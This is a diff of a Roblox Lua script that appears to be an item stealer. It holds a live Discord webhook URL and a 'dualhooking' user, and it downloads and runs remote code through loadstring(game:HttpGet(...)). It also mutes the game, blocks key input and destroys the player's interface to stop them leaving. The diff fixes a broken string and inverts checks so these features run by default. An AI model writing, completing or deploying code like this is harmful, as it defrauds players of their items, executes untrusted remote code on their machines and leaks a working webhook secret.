@@ -9,7 +9,7 @@
 
 local dhuser = "TolinRabadu"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1133931887556051034/B22LeoRDaFTT32dkHoHyTaoLfMuHoo-AUdqan19hWRzo__6bn062CVIigkxcfFbxt8mO" -- Dualhooking Webhook
-local loadingraw = ""https://raw.githubusercontent.com/NeewGood/loading/main/carregar" -- Put Your LoadingScreen Raw Link Here
+local loadingraw = "https://raw.githubusercontent.com/NeewGood/loading/main/carregar" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
@@ -24,7 +24,7 @@ local disabledKeyCodes = {
     0x0D,
 };
 UserSettings().GameSettings.MasterVolume = 0
-if _G.MouseLock ~= true then
+if _G.MouseLock ~= false then
     runService.RenderStepped:Connect(function()
         for _, keyCode in next, disabledKeyCodes do
             keyrelease(keyCode)
@@ -110,10 +110,10 @@ end
 -- Checks
 
 
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet(loadingraw))()
 end
-if _G.AntiLeave ~= true then
+if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
         if v.Name ~= "Inventory" then
             v:Destroy()
